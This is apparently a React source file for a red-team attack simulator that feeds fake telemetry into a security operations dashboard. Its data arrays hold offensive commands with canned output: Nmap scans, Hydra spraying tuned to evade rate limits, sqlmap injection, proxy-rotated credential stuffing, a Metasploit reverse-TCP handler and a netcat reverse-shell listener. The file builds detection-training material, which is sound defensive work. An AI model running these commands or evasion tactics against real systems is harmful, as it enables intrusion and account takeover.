import React, { useState, useRef, useEffect, useMemo } from 'react';
import {
  Terminal as TerminalIcon,
  Play,
  RotateCcw,
  Zap,
  Trash2,
  HelpCircle,
  ShieldAlert,
  Flame,
  Cpu,
  Layers,
  CheckCircle2,
  CornerDownLeft,
  Copy,
  Check,
  ChevronRight,
  ExternalLink,
  Laptop,
  Radio,
  Sliders,
  AlertTriangle,
  Server,
  Crosshair,
  Lock,
  ArrowRight,
  Sparkles,
  Maximize2,
  Minimize2
} from 'lucide-react';

// ─── Offensive Attack Arsenal (Copied directly from Noor-Hassan-B/hackathone) ───
export const ATTACK_ARSENAL = [
  {
    id: 'atk-nmap',
    category: 'Reconnaissance',
    label: 'Nmap SYN Stealth Scan',
    cmd: 'nmap -sS -p 22,80,443,5432 -sV 10.42.0.10',
    mitre: 'T1595.001',
    domain: 'network',
    severity: 'medium',
    target: 'edge-target-vm (10.42.0.10)',
    desc: 'Low-noise TCP SYN sweep across enclave ports to fingerprint OS, services, and open daemons.',
    stdout: [
      'Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-14 09:15 UTC',
      'Nmap scan report for edge-target-vm (10.42.0.10)',
      'Host is up (0.00042s latency).',
      'PORT     STATE SERVICE  VERSION',
      '22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu (protocol 2.0)',
      '80/tcp   open  http     nginx/1.24.0 (Ubuntu)',
      '443/tcp  open  ssl/http nginx/1.24.0 (Ubuntu TLS 1.3)',
      '5432/tcp open  pgsql    PostgreSQL DB 15.2',
      'SYN Stealth Scan complete: 4 open ports discovered out of 65535 scanned.'
    ]
  },
  {
    id: 'atk-hydra',
    category: 'Credential Access',
    label: 'Hydra Low-and-Slow Spray',
    cmd: 'sudo hydra -L users.lst -P rockyou.txt -t 4 -W 90 auth-target-vm ssh',
    mitre: 'T1110.003',
    domain: 'auth',
    severity: 'high',
    target: 'auth-target-vm (10.42.0.12)',
    desc: 'Throttled SSH password spraying with 90s inter-request jitter to evade naive rate-limiting thresholds.',
    stdout: [
      '[ATTEMPT] target auth-target-vm - login "root" - pass "summer2025" 1 of 14344391 [child 0]',
      '[ATTEMPT] target auth-target-vm - login "admin" - pass "P@ssw0rd"  2 of 14344391 [child 1]',
      '[ATTEMPT] target auth-target-vm - login "analyst" - pass "welcome1" 3 of 14344391 [child 2]',
      '[STATUS] 3 attempts in 00:04:32h, 4 tries/min, avg 90.4s throttle',
      '[ATTEMPT] target auth-target-vm - login "root" - pass "letmein!" 4 of 14344391 [child 0]',
      '[STATUS] rotating source ip pool → 185.220.101.44 → 185.220.101.9',
      '[STATUS] evading rate-limit :: sleep 274s',
      '[+] 4 of 4 target completed, 0 valid passwords found'
    ]
  },
  {
    id: 'atk-sqlmap',
    category: 'Web Exploitation',
    label: 'SQLMap Blind Injection',
    cmd: 'sqlmap -u "https://10.42.0.10/api/ledger?acc=1092" --batch --risk=3 --level=3 --dbs',
    mitre: 'T1190',
    domain: 'endpoint',
    severity: 'critical',
    target: 'api-target-vm (10.42.0.10)',
    desc: 'Automated boolean blind and error-based SQL injection against API query parameters to exfiltrate database schema.',
    stdout: [
      '[sqlmap] testing connection to target URL: https://10.42.0.10/api/ledger',
      '[sqlmap] checking if the target is protected by some WAF/IPS',
      '[sqlmap] heuristic (basic) test shows GET parameter \'acc\' might be injectable',
      '[sqlmap] testing \'AND boolean-based blind - WHERE or HAVING clause\'',
      '[sqlmap] parameter \'acc\' is vulnerable: DBMS: PostgreSQL 15.2 detected',
      '[sqlmap] fetching database names: threatlens_soc, pg_catalog, information_schema',
      '[!] CRITICAL: data exfiltration attempt detected across 3 tables'
    ]
  },
  {
    id: 'atk-stuffer',
    category: 'Credential Access',
    label: 'Distributed Credential Stuffer',
    cmd: 'python3 stuffer.py --wordlist combos.txt --proxies residential.txt --targets identity-target-vm -c 32',
    mitre: 'T1110.004',
    domain: 'auth',
    severity: 'critical',
    target: 'identity-target-vm (10.42.0.15)',
    desc: 'Rotates 19 residential proxies (RO, DE, US) to spray credential pairs against OAuth identity gateway.',
    stdout: [
      '[stuffer] loaded 42,118 credential pairs from combos.txt',
      '[stuffer] rotating 19 residential proxies (RO, DE, US pool)',
      '[stuffer] [ok] proxy 45.141.84.17 → identity-target-vm | user-112 | 401',
      '[stuffer] [ok] proxy 45.141.84.18 → identity-target-vm | user-113 | 401',
      '[stuffer] [ok] proxy 45.141.84.19 → identity-target-vm | user-114 | 401',
      '[stuffer] [ok] proxy 45.141.84.20 → identity-target-vm | user-115 | 401',
      '[stuffer] pace 4.2 req/s | fan-out 38 accounts | cluster density 0.88'
    ]
  },
  {
    id: 'atk-ghost-tx',
    category: 'Defense Evasion',
    label: 'Ghost Transactions Latency Spike',
    cmd: 'python3 shadow_tx.py --endpoint https://payments-target-vm/api/tx --concurrency 64',
    mitre: 'T1078',
    domain: 'network',
    severity: 'critical',
    target: 'payments-target-vm (10.42.0.22)',
    desc: 'Bursts synthetic transaction replays causing p99 latency spikes (4,120ms) without valid user authentication signals.',
    stdout: [
      '[shadow] burst 1/6 → 40 tx :: p50=180ms p99=4120ms',
      '[shadow] burst 2/6 → 40 tx :: p50=210ms p99=3980ms',
      '[shadow] burst 3/6 → 40 tx :: p50=195ms p99=4340ms',
      '[shadow] status: no auth cookie, amount ±$8,412 stddev',
      '[shadow] burst 4/6 → 40 tx :: promo=SUMMER26 rate=8.2/s',
      '[shadow] complete :: 240 tx submitted / 0 auth events'
    ]
  },
  {
    id: 'atk-gobuster',
    category: 'Content Discovery',
    label: 'Gobuster Directory Brute',
    cmd: 'gobuster dir -u https://10.42.0.10 -w /usr/share/wordlists/dirb/common.txt -t 20',
    mitre: 'T1595.003',
    domain: 'network',
    severity: 'medium',
    target: 'edge-target-vm (10.42.0.10)',
    desc: 'Enumerates hidden administrative directories, backup endpoints, and internal API documentation routes.',
    stdout: [
      '===============================================================',
      'Gobuster v3.6 - Directory Brute-Force Mode',
      'Target: https://10.42.0.10 / Wordlist: common.txt',
      '===============================================================',
      '--> /api (Status: 200) [Size: 104]',
      '--> /admin (Status: 403) [Size: 48]',
      '--> /debug (Status: 200) [Size: 1204]',
      '--> /swagger (Status: 200) [Size: 8402]',
      '--> /.env (Status: 200) [Size: 412] [CRITICAL: Leaked Credentials]'
    ]
  },
  {
    id: 'atk-msf',
    category: 'Command & Control',
    label: 'Metasploit Handler Console',
    cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.42.0.5; set LPORT 4444; run"',
    mitre: 'T1071',
    domain: 'endpoint',
    severity: 'critical',
    target: '10.42.0.5:4444 (Listener)',
    desc: 'Initializes interactive Metasploit Framework reverse TCP C2 session handler to catch incoming beacons.',
    stdout: [
      '[*] Started reverse TCP handler on 10.42.0.5:4444',
      '[*] Sending stage (200774 bytes) to 10.42.0.12',
      '[*] Meterpreter session 1 opened (10.42.0.5:4444 -> 10.42.0.12:49812)',
      'meterpreter > getuid',
      'Server username: NT AUTHORITY\\SYSTEM',
      'meterpreter > sysinfo',
      'OS: Windows Server 2022 Build 20348 (x64)'
    ]
  },
  {
    id: 'atk-nc',
    category: 'Persistence',
    label: 'Netcat Reverse Shell Listener',
    cmd: 'nc -lvnp 4444',
    mitre: 'T1059.004',
    domain: 'network',
    severity: 'high',
    target: '0.0.0.0:4444',
    desc: 'Opens raw TCP listener on port 4444 to catch inbound reverse interactive bash shell connections.',
    stdout: [
      'listening on [any] 4444 ...',
      'connect to [10.42.0.5] from (UNKNOWN) [10.42.0.10] 53210',
      'Linux edge-target-vm 5.15.0-91-generic #101-Ubuntu SMP',
      'uid=0(root) gid=0(root) groups=0(root)',
      'sh: no job control in this shell',
      '# whoami',
      'root'
    ]
  }
];

// ─── Offensive Scenarios (Full Playbooks from hackathone) ─────────────────────
export const OFFENSIVE_SCENARIOS = [
  {
    id: 'brute_force',
    title: 'Low-and-Slow Hydra Brute Force',
    category: 'Credential Access',
    tool: 'Hydra 9.5',
    attacker_vm: 'hydra-attacker (10.42.0.5)',
    target_vm: 'auth-target-vm (10.42.0.12)',
    source_ip: '185.220.101.44',
    mitre: 'T1110.003 - Password Spraying',
    risk: 82,
    severity: 'high',
    summary: 'Authentication failures distributed across a long window with 90s inter-request jitter to evade naive threshold detection.',
    commands: [
      'sudo hydra -L users.lst -P rockyou.txt -t 4 -W 90 auth-target-vm ssh',
      '[ATTEMPT] target auth-target-vm - login "root" - pass "summer2025"',
      '[ATTEMPT] target auth-target-vm - login "admin" - pass "P@ssw0rd"',
      '[STATUS] 3 attempts in 00:04:32h, rotating source ip pool → 185.220.101.44',
      '[STATUS] evading rate-limit :: sleep 274s',
      '[+] Attack completed. Correlated telemetry injected into EDR pipeline.'
    ]
  },
  {
    id: 'credential_stuffing',
    title: 'Distributed Credential Stuffing Cluster',
    category: 'Credential Access',
    tool: 'Python Stuffer + 19 Proxies',
    attacker_vm: 'botnet-attacker-vm (RO/DE/US)',
    target_vm: 'identity-target-vm (10.42.0.15)',
    source_ip: '45.141.84.17',
    mitre: 'T1110.004 - Credential Stuffing',
    risk: 94,
    severity: 'critical',
    summary: 'Coordinated cluster rotating across 19 residential proxies authenticating against OAuth identity gateway with stolen credentials.',
    commands: [
      'python3 stuffer.py --wordlist combos.txt --proxies residential.txt -c 32',
      '[stuffer] rotating 19 residential proxies (RO,DE,US pool)',
      '[stuffer] proxy 45.141.84.17 → identity-target-vm | user-112 | 401',
      '[stuffer] proxy 45.141.84.18 → identity-target-vm | user-113 | 401',
      '[stuffer] DBSCAN cluster density 0.88 confirmed. Alert dispatched.'
    ]
  },
  {
    id: 'port_scan',
    title: 'Port-Scan Reconnaissance Sweep',
    category: 'Reconnaissance',
    tool: 'Nmap 7.94',
    attacker_vm: 'recon-attacker-vm (10.42.0.8)',
    target_vm: 'edge-target-vm (10.42.0.10)',
    source_ip: '91.121.44.77',
    mitre: 'T1595.001 - Scanning IP Blocks',
    risk: 71,
    severity: 'medium',
    summary: 'Single offensive node fanning out across enclave ports to fingerprint OS, exposed HTTP, SSH, and database endpoints.',
    commands: [
      'nmap -sS -T4 -p 1-65535 --min-rate 800 edge-target-vm',
      'Discovered open port 22/tcp (ssh) on 10.42.0.10',
      'Discovered open port 80/tcp (http) on 10.42.0.10',
      'Discovered open port 5432/tcp (pgsql) on 10.42.0.10',
      'Scan finished: 65,535 ports evaluated in 48 seconds.'
    ]
  },
  {
    id: 'sql_injection',
    title: 'Automated SQLMap Schema Extraction',
    category: 'Web Exploitation',
    tool: 'SQLMap 1.7',
    attacker_vm: 'sqlmap-attacker (10.42.0.9)',
    target_vm: 'api-target-vm (10.42.0.10)',
    source_ip: '194.26.29.112',
    mitre: 'T1190 - Exploit Public Application',
    risk: 96,
    severity: 'critical',
    summary: 'Boolean-based blind and error-based SQL injection probes targeting API query parameters to exfiltrate database tables.',
    commands: [
      'sqlmap -u "https://10.42.0.10/api/ledger?acc=1092" --batch --dbs',
      '[sqlmap] parameter \'acc\' is vulnerable to boolean-based blind injection',
      '[sqlmap] DBMS: PostgreSQL 15.2 detected',
      '[sqlmap] databases extracted: threatlens_soc, pg_catalog, information_schema',
      '[!] Exploit payload captured by WAF and forwarded to EDR correlation.'
    ]
  },
  {
    id: 'ghost_tx',
    title: 'Ghost Transactions / Shadow Replay',
    category: 'Defense Evasion',
    tool: 'Python ShadowReplay',
    attacker_vm: 'shadow-attacker-vm',
    target_vm: 'payments-target-vm (10.42.0.22)',
    source_ip: '203.0.113.9',
    mitre: 'T1078 - Valid Accounts',
    risk: 88,
    severity: 'critical',
    summary: 'Burst of 240 synthetic transactions causing severe p99 latency spikes (4,120ms) without valid authentication tokens.',
    commands: [
      'python3 shadow_tx.py --endpoint https://payments-target-vm/api/tx --concurrency 64',
      '[shadow] burst 1/6 → 40 tx :: p50=180ms p99=4120ms',
      '[shadow] anomaly triggered: amount ±$8,412 stddev, 0 auth cookies',
      '[shadow] completed 240 tx. Latency anomaly alerts dispatched to SOC.'
    ]
  }
];

export default function OffensiveTerminal({ onCommandExecuted, activeScenarioId, events = [], onSelectEvent, onOpenCimLogs, theme = 'dark' }) {
  const [inputCmd, setInputCmd] = useState('');
  const [history, setHistory] = useState([]);
  const [historyIdx, setHistoryIdx] = useState(-1);
  const [terminalLines, setTerminalLines] = useState([
    { text: '┌──(root㉿kali-offensive)-[~]', type: 'prompt' },
    { text: '└─# Offensive Security Arsenal & Attack Simulator active.', type: 'info' },
    { text: 'Target Enclave: 10.42.0.0/24 (Target VMs: 10.42.0.10, 10.42.0.12, 10.42.0.15)', type: 'system' },
    { text: 'Type "help" or select a pre-made weaponized payload from the arsenal below.', type: 'muted' },
  ]);
  const [activeScenario, setActiveScenario] = useState(OFFENSIVE_SCENARIOS[0].id);
  const [simRunning, setSimRunning] = useState(false);
  const [simProgress, setSimProgress] = useState(0);
  const [intensity, setIntensity] = useState('normal'); // 'normal' | 'fast'
  const [copiedCmd, setCopiedCmd] = useState(null);
  const [rightPanelTab, setRightPanelTab] = useState('arsenal'); // 'arsenal' | 'logs'

  const bottomRef = useRef(null);
  const inputRef = useRef(null);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [terminalLines]);

  // Execute terminal command
  const runCommand = async (cmdStr) => {
    if (!cmdStr.trim()) return;

    const trimmed = cmdStr.trim();
    setHistory(prev => [trimmed, ...prev.slice(0, 50)]);
    setHistoryIdx(-1);

    // Append command to terminal output
    setTerminalLines(prev => [
      ...prev,
      { text: `┌──(root㉿kali-offensive)-[~]`, type: 'prompt' },
      { text: `└─# ${trimmed}`, type: 'cmd' }
    ]);
    setInputCmd('');

    // Built-in basic commands
    if (trimmed === 'clear') {
      setTerminalLines([
        { text: '┌──(root㉿kali-offensive)-[~]', type: 'prompt' },
        { text: '└─# Terminal buffer cleared. Offensive arsenal armed.', type: 'info' }
      ]);
      return;
    }

    if (trimmed === 'help') {
      setTerminalLines(prev => [
        ...prev,
        { text: 'Available Offensive Commands & Tools:', type: 'system' },
        { text: '  nmap -sS -p 22,80,443,5432 -sV 10.42.0.10   (Port Scan)', type: 'info' },
        { text: '  hydra -l root -P rockyou.txt 10.42.0.10 ssh  (SSH Password Spray)', type: 'info' },
        { text: '  sqlmap -u "https://10.42.0.10/api" --dbs     (SQL Injection)', type: 'info' },
        { text: '  python3 cred_stuffer.py --proxies 19         (Credential Stuffing)', type: 'info' },
        { text: '  curl -X POST https://10.42.0.10/tx           (Ghost Transaction Flood)', type: 'info' },
        { text: '  gobuster dir -u https://10.42.0.10 -w dir.txt (Directory Brute Force)', type: 'info' },
        { text: '  msfconsole                                   (Metasploit C2 Handler)', type: 'info' },
        { text: '  nc -lvnp 4444                                (Reverse Shell Listener)', type: 'info' },
        { text: '  whoami / id / uname -a / ifconfig            (Local System Info)', type: 'muted' },
        { text: '  clear                                        (Clear Terminal)', type: 'muted' },
      ]);
      return;
    }

    if (trimmed === 'whoami') {
      setTerminalLines(prev => [...prev, { text: 'root (uid=0 gid=0 groups=0(root))', type: 'output' }]);
      return;
    }

    if (trimmed === 'ifconfig') {
      setTerminalLines(prev => [
        ...prev,
        { text: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500', type: 'output' },
        { text: '        inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255', type: 'output' },
        { text: 'tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500', type: 'output' },
        { text: '        inet 10.42.0.5  netmask 255.255.255.0  destination 10.42.0.1', type: 'output' }
      ]);
      return;
    }

    // Match against arsenal
    const matchedArsenal = ATTACK_ARSENAL.find(a => 
      trimmed.toLowerCase().includes(a.cmd.split(' ')[0].toLowerCase())
    );

    if (matchedArsenal) {
      setTerminalLines(prev => [
        ...prev,
        { text: `[+] Deploying offensive weapon: ${matchedArsenal.label}`, type: 'system' },
        { text: `[+] Target: ${matchedArsenal.target} | MITRE: ${matchedArsenal.mitre}`, type: 'warning' }
      ]);

      // Fire event to parent correlation pipeline IMMEDIATELY so logs update in real time
      if (onCommandExecuted) {
        const eventUuid = 'EVT-ATK-' + Math.random().toString(36).substring(2, 8).toUpperCase();
        onCommandExecuted({
          type: 'event',
          event_uuid: eventUuid,
          scenario_id: activeScenarioId,
          event_type: matchedArsenal.category.toLowerCase().replace(/\s+/g, '_'),
          domain: matchedArsenal.domain,
          severity: matchedArsenal.severity,
          mitre_technique_id: matchedArsenal.mitre,
          mitre_technique_name: matchedArsenal.label,
          command_line: trimmed,
          source_host: 'kali-offensive-vm',
          dest_host: matchedArsenal.target.split(' ')[0],
          source_ip: '10.42.0.5',
          dest_ip: '10.42.0.10',
          user_id: 'kali-attacker',
          process_name: matchedArsenal.cmd.split(' ')[0],
          timestamp: new Date().toISOString(),
          raw_payload: {
            tool: matchedArsenal.label,
            command: trimmed,
            target: matchedArsenal.target,
            desc: matchedArsenal.desc
          }
        });
      }

      setRightPanelTab('logs');

      // Stream stdout line by line
      for (const line of matchedArsenal.stdout) {
        await new Promise(r => setTimeout(r, 100));
        setTerminalLines(prev => [...prev, { text: line, type: 'output' }]);
      }

      setTerminalLines(prev => [
        ...prev,
        { text: `[✓] Execution successful. Real telemetry event dispatched to SOC correlation pipeline.`, type: 'success' }
      ]);
    } else {
      // Generic command execution simulation - also generates real-time telemetry!
      const isNet = trimmed.includes('curl') || trimmed.includes('ping') || trimmed.includes('nc') || trimmed.includes('ssh') || trimmed.includes('10.');
      const isAuth = trimmed.includes('hydra') || trimmed.includes('login') || trimmed.includes('pass') || trimmed.includes('user') || trimmed.includes('su');
      const isCloud = trimmed.includes('aws') || trimmed.includes('s3') || trimmed.includes('cloud') || trimmed.includes('iam');
      const domain = isCloud ? 'cloud' : isAuth ? 'auth' : isNet ? 'network' : 'endpoint';
      const cmdUuid = 'EVT-CMD-' + Math.random().toString(36).substring(2, 8).toUpperCase();

      if (onCommandExecuted) {
        onCommandExecuted({
          type: 'event',
          event_uuid: cmdUuid,
          scenario_id: activeScenarioId,
          event_type: 'cli_command_execution',
          domain,
          severity: 'high',
          mitre_technique_id: 'T1059.004',
          mitre_technique_name: 'Unix Shell Execution',
          command_line: trimmed,
          source_host: 'kali-offensive-vm',
          dest_host: 'edge-target-vm (10.42.0.10)',
          source_ip: '10.42.0.5',
          dest_ip: '10.42.0.10',
          user_id: 'root',
          process_name: trimmed.split(' ')[0],
          timestamp: new Date().toISOString(),
          raw_payload: {
            shell: '/bin/bash',
            command: trimmed
          }
        });
      }

      setRightPanelTab('logs');

      setTerminalLines(prev => [
        ...prev,
        { text: `[+] Executing: ${trimmed}`, type: 'info' },
        { text: `[+] Session established with target enclave (10.42.0.10). Ingested into SOC as ${cmdUuid}.`, type: 'output' }
      ]);
    }
  };

  // Deploy complete offensive scenario playbook with step-by-step real-time telemetry streaming
  const deployScenarioPlaybook = async (scenarioObj) => {
    if (simRunning) return;
    setSimRunning(true);
    setSimProgress(0);
    setRightPanelTab('logs');

    const delay = intensity === 'fast' ? 180 : 380;

    setTerminalLines(prev => [
      ...prev,
      { text: `════════════════════════════════════════════════════════════════`, type: 'system' },
      { text: `[!] LAUNCHING PLAYBOOK: ${scenarioObj.title.toUpperCase()}`, type: 'warning' },
      { text: `[*] Attacker Node: ${scenarioObj.attacker_vm} • Target: ${scenarioObj.target_vm}`, type: 'info' },
      { text: `[*] Technique: ${scenarioObj.mitre} | Risk Level: ${scenarioObj.risk}/100`, type: 'info' },
      { text: `════════════════════════════════════════════════════════════════`, type: 'system' }
    ]);

    for (let i = 0; i < scenarioObj.commands.length; i++) {
      await new Promise(r => setTimeout(r, delay));
      const line = scenarioObj.commands[i];
      setTerminalLines(prev => [...prev, { text: line, type: 'output' }]);
      setSimProgress(Math.round(((i + 1) / scenarioObj.commands.length) * 100));

      // Emit real-time telemetry log for each active step in the playbook!
      if (onCommandExecuted && !line.startsWith('Scan finished') && !line.startsWith('Discovered') && !line.startsWith('[+] Attack completed')) {
        const stepUuid = 'EVT-PBK-' + Math.random().toString(36).substring(2, 8).toUpperCase();
        const domain = scenarioObj.category.includes('Credential') ? 'auth' : scenarioObj.category.includes('Web') ? 'endpoint' : 'network';
        onCommandExecuted({
          type: 'event',
          event_uuid: stepUuid,
          scenario_id: activeScenarioId,
          event_type: scenarioObj.category.toLowerCase().replace(/\s+/g, '_'),
          domain,
          severity: scenarioObj.severity,
          mitre_technique_id: scenarioObj.mitre.split(' - ')[0],
          mitre_technique_name: `${scenarioObj.title} (Step ${i + 1})`,
          command_line: line,
          source_host: scenarioObj.attacker_vm.split(' ')[0],
          dest_host: scenarioObj.target_vm.split(' ')[0],
          source_ip: scenarioObj.source_ip || '10.42.0.5',
          dest_ip: '10.42.0.10',
          user_id: 'kali-redteam',
          process_name: scenarioObj.tool.split(' ')[0],
          timestamp: new Date().toISOString(),
          raw_payload: {
            playbook: scenarioObj.title,
            step: i + 1,
            output: line,
            risk: scenarioObj.risk
          }
        });
      }
    }

    setTerminalLines(prev => [
      ...prev,
      { text: `[✓] PLAYBOOK DEPLOYED SUCCESSFULLY. All steps ingested into SIEM in real time.`, type: 'success' },
      { text: `════════════════════════════════════════════════════════════════`, type: 'system' }
    ]);

    setSimRunning(false);
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      runCommand(inputCmd);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (history.length > 0 && historyIdx < history.length - 1) {
        const nextIdx = historyIdx + 1;
        setHistoryIdx(nextIdx);
        setInputCmd(history[nextIdx]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIdx > 0) {
        const nextIdx = historyIdx - 1;
        setHistoryIdx(nextIdx);
        setInputCmd(history[nextIdx]);
      } else if (historyIdx === 0) {
        setHistoryIdx(-1);
        setInputCmd('');
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      const match = ATTACK_ARSENAL.find(a => a.cmd.startsWith(inputCmd));
      if (match) {
        setInputCmd(match.cmd);
      }
    }
  };

  const handleCopyCmd = (cmd, e) => {
    e.stopPropagation();
    navigator.clipboard.writeText(cmd);
    setCopiedCmd(cmd);
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  const selectedScenarioObj = OFFENSIVE_SCENARIOS.find(s => s.id === activeScenario) || OFFENSIVE_SCENARIOS[0];

  return (
    <div className="space-y-6">
      {/* ── Top Header: Attack Arsenal & Simulation Framework ───────────────── */}
      <div className="bg-[#111827] border border-[#1f293d] rounded-xl p-5 shadow-xl">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <TerminalIcon className="w-5 h-5 text-emerald-400" />
              <h2 className="text-base font-bold text-white tracking-wide">
                Offensive Security Simulator & Attack Arsenal Deployer
              </h2>
              <span className="px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[10px] font-mono font-bold">
                Kali Offensive Enclave
              </span>
              <span className="px-2 py-0.5 rounded bg-red-500/10 border border-red-500/30 text-red-400 text-[10px] font-mono font-bold">
                Red-Team Simulation
              </span>
            </div>
            <p className="text-xs text-gray-400 max-w-3xl leading-relaxed">
              Execute weaponized attack techniques directly through the interactive Kali shell or deploy end-to-end multi-stage offensive playbooks (Hydra, SQLMap, Nmap, Stuffer, Ghost TX). Every simulated attack generates real-time telemetry into the EDR datastore.
            </p>
          </div>

          <div className="flex items-center gap-3 shrink-0">
            <div className="bg-[#0b0f17] border border-[#1f293d] rounded-lg px-3 py-2 text-center">
              <div className="text-lg font-mono font-bold text-emerald-400">{ATTACK_ARSENAL.length}</div>
              <div className="text-[10px] font-mono text-gray-500">Weapons in Arsenal</div>
            </div>
            <div className="bg-[#0b0f17] border border-[#1f293d] rounded-lg px-3 py-2 text-center">
              <div className="text-lg font-mono font-bold text-blue-400">{OFFENSIVE_SCENARIOS.length}</div>
              <div className="text-[10px] font-mono text-gray-500">Attack Playbooks</div>
            </div>
            <div className="bg-[#0b0f17] border border-[#1f293d] rounded-lg px-3 py-2 text-center">
              <div className="text-lg font-mono font-bold text-red-400">10.42.0.0/24</div>
              <div className="text-[10px] font-mono text-gray-500">Target Enclave</div>
            </div>
          </div>
        </div>
      </div>

      {/* ── Attack Playbook Deployment Control Deck ─────────────────────────── */}
      <div className="bg-[#111827] border border-[#1f293d] rounded-xl p-5 space-y-4 shadow-xl">
        <div className="flex items-center justify-between border-b border-[#1f293d] pb-3">
          <div className="flex items-center gap-2">
            <Zap className="w-4 h-4 text-amber-400" />
            <h3 className="text-sm font-bold text-white font-mono uppercase tracking-wide">
              Select Attack Playbook To Deploy
            </h3>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-[10px] font-mono text-gray-400">Intensity:</span>
            <button
              onClick={() => setIntensity('normal')}
              className={`px-2 py-0.5 rounded text-[10px] font-mono border transition ${
                intensity === 'normal'
                  ? 'bg-blue-600 border-blue-400 text-white font-bold'
                  : 'bg-[#0b0f17] border-[#1f293d] text-gray-400'
              }`}
            >
              Normal (Paced)
            </button>
            <button
              onClick={() => setIntensity('fast')}
              className={`px-2 py-0.5 rounded text-[10px] font-mono border transition ${
                intensity === 'fast'
                  ? 'bg-red-600 border-red-400 text-white font-bold'
                  : 'bg-[#0b0f17] border-[#1f293d] text-gray-400'
              }`}
            >
              Fast (Burst)
            </button>
          </div>
        </div>

        {/* Playbook Cards Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
          {OFFENSIVE_SCENARIOS.map(sc => {
            const isSelected = sc.id === activeScenario;
            return (
              <button
                key={sc.id}
                onClick={() => setActiveScenario(sc.id)}
                className={`p-3 rounded-lg border text-left transition font-mono relative overflow-hidden ${
                  isSelected
                    ? 'bg-emerald-950/30 border-emerald-500 shadow-md ring-1 ring-emerald-500/30'
                    : 'bg-[#0b0f17] border-[#1f293d] hover:border-gray-700'
                }`}
              >
                <div className="flex items-center justify-between mb-1.5">
                  <span className={`text-[9px] uppercase px-1.5 py-0.2 rounded border ${
                    sc.severity === 'critical' ? 'bg-red-950/60 border-red-500/30 text-red-400' :
                    sc.severity === 'high' ? 'bg-orange-950/60 border-orange-500/30 text-orange-400' :
                    'bg-blue-950/60 border-blue-500/30 text-blue-400'
                  }`}>
                    {sc.severity}
                  </span>
                  <span className="text-[10px] text-gray-500 font-bold">
                    Risk {sc.risk}
                  </span>
                </div>

                <div className="text-xs font-bold text-white truncate">
                  {sc.title}
                </div>

                <div className="text-[10px] text-gray-400 mt-1 truncate">
                  Tool: <span className="text-emerald-400">{sc.tool}</span>
                </div>
              </button>
            );
          })}
        </div>

        {/* Deploy Action Bar */}
        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-3 border-t border-[#1f293d] bg-[#0b0f17] p-3 rounded-lg">
          <div className="text-xs font-mono text-gray-300">
            Selected: <strong className="text-white">{selectedScenarioObj.title}</strong> &bull; Attacker: <span className="text-red-400">{selectedScenarioObj.attacker_vm}</span> &rarr; Target: <span className="text-cyan-400">{selectedScenarioObj.target_vm}</span>
          </div>

          <div className="flex items-center gap-3 w-full sm:w-auto">
            {simRunning && (
              <div className="flex items-center gap-2 flex-1 sm:w-48">
                <div className="w-full bg-gray-800 rounded-full h-2 overflow-hidden border border-gray-700">
                  <div
                    className="bg-emerald-500 h-2 transition-all duration-300"
                    style={{ width: `${simProgress}%` }}
                  />
                </div>
                <span className="text-[10px] font-mono text-emerald-400 font-bold">{simProgress}%</span>
              </div>
            )}

            <button
              onClick={() => deployScenarioPlaybook(selectedScenarioObj)}
              disabled={simRunning}
              className={`flex items-center gap-2 px-5 py-2 rounded-lg text-xs font-bold font-mono transition shadow-md ${
                simRunning
                  ? 'bg-gray-800 text-gray-500 cursor-not-allowed border border-gray-700'
                  : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
              }`}
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              {simRunning ? 'Deploying Playbook...' : 'Deploy Attack Playbook'}
            </button>
          </div>
        </div>
      </div>

      {/* ── Dual View: Kali Terminal + Attack Arsenal Grid ───────────────────── */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">

        {/* Left: Interactive Kali Linux Shell (7 Cols) */}
        <div className="lg:col-span-7 bg-[#050811] border border-[#1f293d] rounded-xl overflow-hidden shadow-2xl flex flex-col h-[520px]">
          {/* Terminal Window Header Bar */}
          <div className="bg-[#0b0f17] border-b border-[#1f293d] px-4 py-2.5 flex items-center justify-between select-none">
            <div className="flex items-center gap-2">
              <span className="w-3 h-3 rounded-full bg-red-500/80 inline-block" />
              <span className="w-3 h-3 rounded-full bg-amber-500/80 inline-block" />
              <span className="w-3 h-3 rounded-full bg-emerald-500/80 inline-block" />
              <span className="text-xs font-mono font-bold text-gray-300 ml-2">
                root@kali-offensive: ~ (Offensive Shell v2.4)
              </span>
            </div>

            <div className="flex items-center gap-2 text-xs font-mono text-gray-500">
              <button
                onClick={() => setTerminalLines([{ text: '┌──(root㉿kali-offensive)-[~]', type: 'prompt' }, { text: '└─# Terminal buffer cleared.', type: 'info' }])}
                className="hover:text-gray-300 transition"
                title="Clear screen"
              >
                <Trash2 className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          {/* Terminal Output Stream */}
          <div className="flex-1 p-4 overflow-y-auto font-mono text-xs space-y-1 scrollbar-thin select-text">
            {terminalLines.map((line, idx) => {
              let textCls = 'text-gray-300';
              if (line.type === 'prompt') textCls = 'text-blue-400 font-bold';
              else if (line.type === 'cmd') textCls = 'text-white font-bold';
              else if (line.type === 'info') textCls = 'text-cyan-400';
              else if (line.type === 'warning') textCls = 'text-amber-400';
              else if (line.type === 'success') textCls = 'text-emerald-400 font-bold';
